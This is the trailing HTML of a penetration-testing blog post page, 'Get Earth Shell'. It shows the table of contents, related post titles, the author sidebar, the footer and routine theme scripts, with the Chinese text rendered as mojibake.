class="toc-number">5.</span> <span class="toc-text"> XOR åˆæ¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BD%E9%80%81%E4%BA%86%E4%B8%80%E4%B8%AAwebshell"><span class="toc-number">6.</span> <span class="toc-text"> ç™½é€äº†ä¸€ä¸ª webshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-earth-shell"><span class="toc-number">7.</span> <span class="toc-text"> Get-Earth-Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#finally"><span class="toc-number">8.</span> <span class="toc-text"> Finally</span></a></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/" rel="bookmark" title="æ‰«æä¸æ­¢ nc&amp;nmap">æ‰«æä¸æ­¢ nc&amp;nmap</a></li><li><a href="/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/" rel="bookmark" title="ä¸ä¼šå°±æœsearchsploit">ä¸ä¼šå°±æœsearchsploit</a></li><li><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/" rel="bookmark" title="MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§">MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§</a></li><li class="active"><a href="/post/Get-Earth-Shell/" rel="bookmark" title="Get Earth Shell">Get Earth Shell</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="MorIo24" src="/assets/avatar.webp"><p class="name" itemprop="name">MorIo24</p><div class="description" itemprop="description">Never hack for profit</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">7</span><span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">3</span><span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">5</span><span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ctf-learner" class="item github" title="https://github.com/ctf-learner"><i class="ic i-github"></i></a><a target="_blank" rel="noopener external nofollow noreferrer" href="https://gitee.com/morio24" class="item gitee" title="https://gitee.com/morio24"><i class="ic i-gitee"></i></a><a href="gmail:morio24@qq.com" rel="external nofollow noreferrer" class="item email" title="gmail:morio24@qq.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/me" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li></ul></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-coffee"></i>å‹é“¾</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/AWD/" title="åˆ†ç±»äºAWD">AWD</a></div><span><a href="/post/AWD-waf%E8%84%9A%E6%9C%AC/">AWD-wafè„šæœ¬</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="åˆ†ç±»äºPenetration Test">Penetration Test</a></div><span><a href="/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/">æ‰«æä¸æ­¢ nc&amp;nmap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%B3%E4%BA%8EshokaX/" title="åˆ†ç±»äºå…³äºshokaX">å…³äºshokaX</a></div><span><a href="/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/">æ­åšå®¢ä¸€è·¯çš„å¿ƒé…¸</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="åˆ†ç±»äºPenetration Test">Penetration Test</a></div><span><a href="/post/Get-Earth-Shell/">Get Earth Shell</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="åˆ†ç±»äºPenetration Test">Penetration Test</a></div><span><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/">MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="åˆ†ç±»äºPenetration Test">Penetration Test</a></div><span><a href="/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/">ä¸ä¼šå°±æœsearchsploit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/AWD/" title="åˆ†ç±»äºAWD">AWD</a></div><span><a href="/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/">AWDåˆä½“éªŒ</a></span></li></ul></div></div><div class="status"><div class="copyright">Â© è¿½é£èµ¶æœˆè«åœç•™ï¼Œå¹³èŠœå°½å¤„æ˜¯æ˜¥å±± -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">MorIo24 @ MorIo24's blog</span></div><div class="count"><div class="time-last"><span id="timeDate">è½½å…¥å¤©æ•°...</span><span id="times">è½½å…¥æ—¶åˆ†ç§’...</span><script>var now = new Date();
function createtime() {
    var grt= new Date("4/16/2024 13:14:20");
    now.setTime(now.getTime()+250);
    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
    document.getElementById("timeDate").innerHTML = "å°ç ´ç«™åœ¨é£é›¨ä¸­å­¤è‹¦ä¼¶ä»ƒåº¦è¿‡äº† "+dnum+" å¤© ";
    document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
}
setInterval("createtime()",250);</script></div><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="ç«™ç‚¹æ€»å­—æ•°">69k å­—</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">1:03</span></div><div class="powered-by">åŸºäº <a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io/">Hexo</a> &amp; Theme.<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div><script src="/live2d-widget/autoload.js"></script></div></div></footer></div><script data-config="" type="text/javascript">var LOCAL = {
    ispost: true,
        path: `post/Get-Earth-Shell/`,
        favicon: {
        show: `å¥½ä¹…ä¸è§~(áƒ¦Ë˜âŒ£Ë˜áƒ¦)~`,
        hide: `404å’¯(ï½¡Ã­ _ Ã¬ï½¡)`
    },
    search: {
        placeholder: "æ–‡ç« æœç´¢",
        empty: "å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",
        stats: "${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">æ–‡ç« æ—¶æ•ˆæ€§æç¤º</span><br>è¿™æ˜¯ä¸€ç¯‡å‘å¸ƒäº {{publish}} å¤©å‰ï¼Œæœ€åä¸€æ¬¡æ›´æ–°åœ¨ {{updated}} å¤©å‰çš„æ–‡ç« ï¼Œéƒ¨åˆ†ä¿¡æ¯å¯èƒ½å·²ç»å‘ç”Ÿæ”¹å˜ï¼Œè¯·æ³¨æ„ç”„åˆ«ã€‚</p></div>`,
    quiz: {
        choice: `å•é€‰é¢˜`,
        multiple: `å¤šé€‰é¢˜`,
        true_false: `åˆ¤æ–­é¢˜`,
        essay: `é—®ç­”é¢˜`,
        gap_fill: `å¡«ç©ºé¢˜`,
        mistake: `é”™é¢˜å¤‡æ³¨`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.2.4/pace.min.js" async=""></script><script src="/js/siteInit.js?v=0.4.2" type="module" fetchpriority="high" defer=""></script></body></html>